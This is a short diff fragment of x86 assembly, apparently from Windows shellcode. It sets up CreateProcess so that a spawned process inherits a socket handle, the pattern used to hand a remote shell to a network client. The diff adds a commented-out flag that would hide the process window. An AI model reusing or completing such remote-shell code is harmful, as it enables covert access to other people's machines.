@@ -206,6 +206,7 @@ start:
 	push edi		; push the pointer to the STARTUPINFORMATION struct to lpStartupinfo attribute  
 	push eax		; set lpstartupdirectory to NULL
 	push eax		; set the lpEnviroment to NULL
+	;push 0x08000000		; set the dwcreationflag to CREATE_NO_WINDOW
 	push eax		; set the dwcreationflag to 0
 	inc eax			; eax = 1
 	push eax		; set bInheritHandles argument to TRUE since client need to inherit the socket file descriptor
